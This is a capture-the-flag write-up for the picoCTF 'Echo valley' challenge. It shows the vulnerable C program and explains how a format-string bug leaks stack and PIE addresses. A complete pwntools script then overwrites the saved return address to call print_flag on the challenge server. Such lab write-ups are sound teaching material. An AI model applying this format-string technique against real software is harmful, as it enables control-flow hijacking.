# Write-up of the challenge "Echo valley"

This challenge is part of the "Binary exploitation" category and is in the medium category.

# Goal of the challenge

The objective of this challenge is to use the **format string attack** to call **print_flag**

## Program structure

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
    
}

int main()
{
    echo_valley();
    return 0;
}

```

## Problem

So the problem I encountered while doing this challenge is how could I call **print_flag** without **buffer overflow**, however there's a **format string attack** that means we need to use **fmstr attack** to overrite the stack to point to print_flag but how though? Also there's PIE so how can we also call print_flag even if we have a place to write to?


## Security breach

The secruity breach here is that the **printf** doesn't have any option like **%x** leading to **format string attack!**

## Solution

So after some leaking I saw that the **20th leak** is the **stack leak** and the **21th leak** is the **PIE leak**. So now we gotta subtract the leak from the PIE leak and the one in the binary and find the offset so this is how I found the leak from the binary:

```
disas main
2/gx 0x7ffe94b2fdd0-8
x/2gx 0x7ffe94b2fdd0-8
2/gx 0x7ffe94b2fdd0
x/2gx 0x7ffe94b2fdd0
r
x/2gx 0x7fffffffda80
x/2gx 0x7fffffffda80-8
disas main
%21p
%21$p
r
vim
vmmap 0x555555555413
p/x 0x555555555413 - 0x555555554000
r
vmmap 0x555555555413
p/x 0x555555554000-0x555555555000
2/gx 0x7ffe94b2fdd0
2/2gx 0x7ffe94b2fdd0
x/2gx 0x7ffe94b2fdd0

```

The offset would be **p/x 0x555555554000-0x555555555000** = **0x1413**
Now that we have the **PIE base** we can call **print_flag** in peace. However how did we know that that address was a **PIE adress** as you can see below:

Leak: 
```
# You heard in the distance:
# 0x7ffe94b2fba0
# (nil)
# (nil)
# 0x56272280a711
# (nil)
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0x7025702570257025
# 0xa
# 0xfb6bf767a089ac00
# 0x7ffe94b2fdd0
# 0x562719089413     1413:       b8 00 00 00 00          mov    $0x0,%eax
```

when something often starts with **0x562** it's often a **PIE address** and when something starts with **0x7ff** it's often a **stack address**. Also since the stack decreases when we go up then to find it's **RIP** we shall subtract **8** instead of adding **8**. So we just launch a **fmstr payload at offset 6** since that's the begining of our input as you can see **0x7025702570257025**.

solve.py

```python
from pwn import *
import re

context.arch = 'amd64'

p = remote('shape-facility.picoctf.net', 53037)
# p = process('./valley')
e = ELF('./valley')

p.sendline(b'%20$p')

p.recvuntil(b'You heard in the distance: ')

first_stack = int(p.recvline().decode(), 16)

p.sendline(b'%21$p')

p.recvuntil(b'You heard in the distance: ')

pie_leak = int(p.recvline().decode(), 16)

e.address = pie_leak - 0x1413

print("PIE_LEAK", pie_leak)
print("FIRSTT_STACK", first_stack)


payload_final = fmtstr_payload(6, {first_stack - 8: e.sym["print_flag"]}, write_size='short')

p.sendline(payload_final)

p.sendline(b'exit')


p.interactive()

```


After excuting the script we get the flag back!

If you liked this writeup you can star my repository.